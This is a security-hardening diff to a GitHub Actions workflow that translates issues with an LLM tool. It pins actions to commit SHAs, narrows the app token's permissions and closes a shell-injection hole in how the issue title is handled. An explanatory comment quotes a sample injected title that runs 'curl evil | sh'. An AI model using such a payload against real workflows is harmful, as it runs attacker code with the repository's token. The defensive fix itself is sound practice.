@@ -15,13 +15,20 @@ jobs:
     steps:
       - name: Generate App Token
         id: app-token
-        uses: actions/create-github-app-token@v2
+        uses: actions/create-github-app-token@fee1f7d63c2ff003460e3d139729b119787bc349 # v2.2.2
         with:
           app-id: ${{ secrets.AGAV_APP_ID }}
           private-key: ${{ secrets.AGAV_APP_PRIVATE_KEY }}
+          # Scope the installation token: this workflow edits issue titles and
+          # posts issue comments. It also checks out the repo (read). Without a
+          # permission-* input the token inherits every permission the app is
+          # installed with.
+          permission-contents: read
+          permission-issues: write
 
-      - uses: actions/checkout@v4.2.2
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
         with:
+          persist-credentials: false
           token: ${{ steps.app-token.outputs.token }}
 
       - name: Install Agav
@@ -34,6 +41,12 @@ jobs:
       - name: Check and translate
         env:
           GH_TOKEN: ${{ steps.app-token.outputs.token }}
+          # Pass the untrusted issue title through the environment, never inline
+          # into the script. An inline ${{ ... }} expansion of attacker-controlled
+          # text (an issue title such as `"; curl evil | sh; "`) is a shell
+          # injection that would run with this workflow's app token. Reading it
+          # from $ISSUE_TITLE keeps it as data, not code.
+          ISSUE_TITLE: ${{ github.event.issue.title }}
         run: |
           # Skip if already translated
           BODY=$(gh issue view ${{ github.event.issue.number }} --json body -q .body)
@@ -42,7 +55,7 @@ jobs:
             exit 0
           fi
 
-          TITLE="${{ github.event.issue.title }}"
+          TITLE="$ISSUE_TITLE"
           PROMPT="Determine if this text is in English. Title: ${TITLE}. Body: $(echo "$BODY" | head -c 2000). If the text is NOT in English, respond with a JSON object: {\"needs_translation\":true,\"translated_title\":\"English title\",\"translated_body\":\"English translation of the body\",\"language\":\"detected language\"}. If the text IS in English, respond with: {\"needs_translation\":false}. Respond with ONLY the JSON object."
           agav -P "$PROMPT" --provider gemini --model gemini-3.5-flash-lite > /tmp/translate-raw.txt 2>/dev/null
           grep -o '{[^}]*}' /tmp/translate-raw.txt > /tmp/translate.json || echo '{"needs_translation":false}' > /tmp/translate.json
